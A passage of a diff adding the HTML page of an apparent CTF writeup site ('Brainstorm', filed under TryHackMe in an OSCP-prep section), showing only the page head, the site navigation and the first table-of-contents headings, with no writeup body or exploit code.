@@ -1,0 +1,3611 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../Brainpan1/">
+      
+      
+        <link rel="next" href="../BufferOverFlowPrep/">
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.18">
+    
+    
+      
+        <title>Brainstorm - Nate's CTF Writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.7e37652d.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="cyan">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#brainstorm" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="Nate&#39;s CTF Writeups" class="md-header__button md-logo" aria-label="Nate's CTF Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Nate's CTF Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Brainstorm
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="cyan"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="cyan" data-md-color-accent="light-green"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Nate&#39;s CTF Writeups" class="md-nav__button md-logo" aria-label="Nate's CTF Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Nate's CTF Writeups
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Home
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    IoT
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            IoT
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Nightowl
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Nightowl
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../IoT/nightowl/nvr/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    ssr21q_v102_nvr04
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    OSCP Prep
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            OSCP Prep
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../oscp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Oscp
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    HackTheBox
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            HackTheBox
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Active/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Active
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Arctic/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Arctic
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Bashed/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Bashed
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Bastion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Bastion
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Beep/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Beep
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Blocky/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Blocky
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Blue/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Blue
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Bounty/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Bounty
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Devel/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Devel
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Grandpa/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Grandpa
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Granny/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Granny
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Heist/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Heist
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Jerry/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Jerry
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Lame/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Lame
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Legacy/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Legacy
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Mirai/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Mirai
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Nibbles/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Nibbles
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Optimum/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Optimum
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Pasted%20image%2020220713093106.png/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Pasted image 20220713093106.png
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Remote/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Remote
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Sauna/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Sauna
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Search/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Search
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Shocker/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Shocker
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Sizzle/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Sizzle
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Timelapse/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Timelapse
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/netmon/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Netmon
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_27" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_27" id="__nav_3_2_27_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Work in Progress
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_27_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_27">
+            <span class="md-nav__icon md-icon"></span>
+            Work in Progress
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Work%20in%20Progress/Bastard/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Bastard
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Work%20in%20Progress/Beep/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Beep
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Work%20in%20Progress/Brainfuck/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Brainfuck
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Work%20in%20Progress/Breadcrumbs/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Breadcrumbs
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Work%20in%20Progress/Grandpa/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Grandpa
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Work%20in%20Progress/Kotarak/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Kotarak
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Work%20in%20Progress/Nineveh/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Nineveh
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Work%20in%20Progress/ScriptKiddie/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Script Kiddie
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HackTheBox/Work%20in%20Progress/Solidstate/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Solidstate
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    OSCP practice exam
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            OSCP practice exam
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../OSCP%20practice%20exam/0.%20Intro/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    General
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../OSCP%20practice%20exam/1.%20Cascade/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    10.10.10.182
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../OSCP%20practice%20exam/2.%20Chatterbox/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    10.10.10.74
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../OSCP%20practice%20exam/3.%20Cronos/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Cronos
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../OSCP%20practice%20exam/4.%20Forest/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    10.10.10.161
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../OSCP%20practice%20exam/5.%20Sauna/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    10.10.10.175
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../OSCP%20practice%20exam/6.%20Sense/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    10.10.10.60
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_4" id="__nav_3_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    TryHackMe
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_4">
+            <span class="md-nav__icon md-icon"></span>
+            TryHackMe
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../AD%20Pivoting%20and%20Lateral%20Movement/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Pivoting and lateral movement
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Alfred/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Alfred
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Blueprint/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Blueprint
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Brainpan1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Brainpan 1
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Brainstorm
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    Brainstorm
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    <span class="md-ellipsis">
+      Recon
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Recon">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#scan" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scan
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#explore-the-services" class="md-nav__link">
+    <span class="md-ellipsis">
+      Explore the services
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Explore the services">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ftp" class="md-nav__link">
+    <span class="md-ellipsis">
+      FTP
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit-development" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit Development
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploit Development">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#setting-up-the-dev-environment" class="md-nav__link">
+    <span class="md-ellipsis">
+      Setting up the Dev environment
